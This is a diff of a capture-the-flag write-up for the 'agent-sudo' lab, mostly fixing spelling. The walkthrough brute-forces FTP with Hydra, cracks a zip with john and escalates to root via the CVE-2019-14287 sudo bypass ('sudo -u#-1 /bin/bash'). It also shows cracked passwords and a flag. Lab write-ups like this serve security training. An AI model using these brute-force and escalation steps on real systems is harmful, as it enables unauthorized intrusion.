@@ -6,6 +6,8 @@ categories:
 tags:
   - pwn
   - root
+  - stenography
+  - forensics
 ---
 
 The Nmap scan returns 3 open ports
@@ -45,7 +47,7 @@ Agent R
 </body>
 </html> 
 ```
-This has yielded a differnt page to before! Through the fact agent R says "Are you one of the 25 employees?" makes me thing the agents are named alphabetically, e.g. Agent A, Agent B, Agent C, etc. We can attmept to change the user-agent to differnet characters of the alphabet, however I am going to use a bash script to automate this:
+This has yielded a different page than before! The fact Agent R says "Are you one of the 25 employees?" makes me think the agents are named alphabetically, e.g. Agent A, Agent B, Agent C, etc. We can attempt to change the user-agent to different characters of the alphabet, however, I am going to use a bash script to automate this:
 ```
 #!/bin/bash
 for letter in {A..Z}; do
@@ -59,7 +61,7 @@ Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, 
 From,<br>
 Agent R
 ```
-We now know that their is user named: chris, and that his password is weak. We can try to brute-force the ftp login with username "chris". To do this I will be using Hydra Password Cracker
+We now know that there is a user named: Chris and that his password is weak. We can try to brute-force the ftp login with the username "chris". To do this I will be using Hydra Password Cracker
 ```
 └─$ hydra -l chris -P WordLists/rockyou.txt 10.10.83.69 ftp
  Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -69,7 +71,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-07 17:58:
 [21][ftp] host: 10.10.83.69   login: chris   password: crystal
 1 of 1 target successfully completed, 1 valid password found
 ```
-Bingo! We successfully cracked the ftp password as "crystal"
+Bingo! We successfully cracked the FTP password as "crystal"
 ```
 ftp> dir
 229 Entering Extended Passive Mode (|||55284|)
@@ -86,7 +88,7 @@ All these alien like photos are fake! Agent R stored the real picture inside you
 From,
 Agent C
 ```
-This tells us that their is a password stored inside the image, to retrieve this we can use the Binwalker tool
+This tells us that there is a password stored inside the image, to retrieve this we can use the Binwalker tool
 ```
 └─$ binwalk cute-alien.jpg
 /usr/lib/python3/dist-packages/binwalk/core/magic.py:431: SyntaxWarning: invalid escape sequence '\.'
@@ -95,7 +97,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
 0             0x0             JPEG image data, JFIF standard 1.01
 ```
-This contains no embedded file, lets try the other image: cuteie.png:
+This contains no embedded file, let's try the other image: cuteie.png:
 ```
 └─$ binwalk cutie.png
 /usr/lib/python3/dist-packages/binwalk/core/magic.py:431: SyntaxWarning: invalid escape sequence '\.'
@@ -111,7 +113,7 @@ Ah, we have found the embedded image. We can extract this with the -e flag
 ```
 └─$ binwalk -e cutie.png
 ```
-Now we can change our directly and view the hidden files content
+Now we can change our directly and view the hidden files' content
 ```
 └─$ cd _cutie.png.extracted/; ls -la
 total 324
@@ -125,11 +127,11 @@ drwxr-xr-x 3 ben ben   4096 Jan  7 18:09 ..
 └─$ file 8702.zip
 8702.zip: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
 ```
-We have a zlip file, however it is password protected. We can use john to try crack the hash for the file. Firstly we will convert the zip file into a hash:
+We have a zlip file, however it is password protected. We can use John to try to crack the hash for the file. Firstly we will convert the zip file into a hash:
 ```
 └─$ zip2john 8702.zip > zippedzip.txt
 ```
-Then we can now use john to crack the hash. This may require sudo privilages.
+Then we can now use John to crack the hash. This may require sudo privileges.
 ```
 └─$ sudo john --format=zip zippedzip.txt
 [sudo] password for ben:
@@ -144,7 +146,7 @@ Proceeding with wordlist:/usr/share/john/password.lst
 alien            (8702.zip/To_agentR.txt)
 1g 0:00:00:00 DONE 2/3 (2025-01-07 18:14) 4.000g/s 279600p/s 279600c/s 279600C/s 123456..skyline!
 ```
-The password we have found is "alien". We can now open our password protected zip file.
+The password we have found is "alien". We can now open our password-protected zip file.
 ```
 └─$ 7z x 8702.zip -palien
 7-Zip 24.07 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-06-19
@@ -188,7 +190,7 @@ Don't ask me why the password look cheesy, ask agent R who set this password for
 Your buddy,
 chris 
 ```
-We now have a user and password combanation for user christ, we will now login to ssh with these credentials
+We now have a user and password combination for user Chris, we will now log in to SSH with these credentials
 ```
 james@agent-sudo:~$ ls -la
 total 80
@@ -204,7 +206,7 @@ drwx------ 3 james james  4096 Oct 29  2019 .gnupg
 -rw-r--r-- 1 james james     0 Oct 29  2019 .sudo_as_admin_successful
 -rw-r--r-- 1 james james    33 Oct 29  2019 user_flag.txt
 ```
-We can now retrieve the user flag: b03d975e8c92a7c04146cfa7a5a313c7. To view the Alien_autopsy.jpg image we can download it to our local directory and open it using scp and xdg
+We can now retrieve the user flag: b03d975e8c92a7c04146cfa7a5a313c7. To view the Alien_autopsy.jpg image we can download it to our local directory and open it using SCP and xdg
 ```
 └─$ scp james@10.10.83.69:/home/james/Alien_autospy.jpg .
 james@10.10.83.69's password:
@@ -218,8 +220,8 @@ Alien_autospy.jpg
 We can reverse image search this online:
 ![image](https://github.com/user-attachments/assets/8cd0e437-4c60-493b-9ae7-3a0c0cb24082)
 
-Now to gain root privilages...
-We can check what privilages we have using 
+Now to gain root privileges...
+We can check what privileges we have using 
 ```
 james@agent-sudo:~$ sudo -l
 [sudo] password for james:
@@ -228,7 +230,7 @@ Matching Defaults entries for james on agent-sudo:
 User james may run the following commands on agent-sudo:
   (ALL, !root) /bin/bash
 ```
-(ALL, !root) /bin/bash looks promicing. Finding some information on this command we come across https://www.exploit-db.com/exploits/47502 with CVE: 2019-14287. This vulnerability can be exploited using
+(ALL, !root) /bin/bash looks promising. Finding some information on this command we come across https://www.exploit-db.com/exploits/47502 with CVE: 2019-14287. This vulnerability can be exploited using
 ```
 sudo -u#-1 /bin/bash
 ```
@@ -238,7 +240,7 @@ james@agent-sudo:~$ sudo -u#-1 /bin/bash
 root@agent-sudo:~# whoami
 root 
 ```
-We now have root privilages!
+We now have root privileges!
 ```
 root@agent-sudo:/root# cat root.txt
 To Mr.hacker,
